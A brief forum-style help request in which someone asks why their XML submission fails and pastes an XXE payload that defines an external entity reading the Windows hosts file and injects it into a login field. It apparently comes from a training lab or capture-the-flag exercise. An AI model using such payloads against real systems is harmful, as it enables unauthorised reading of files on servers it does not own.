##

i have tried to get this xml through but i get an error even though a colleague of mine did the same and it worked(same with the internet) so i am out of ideas

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY XXE SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts" >
]>
<reset>
  <login>&XXE;</login>
  <secret>Cyber</secret>
</reset>
```
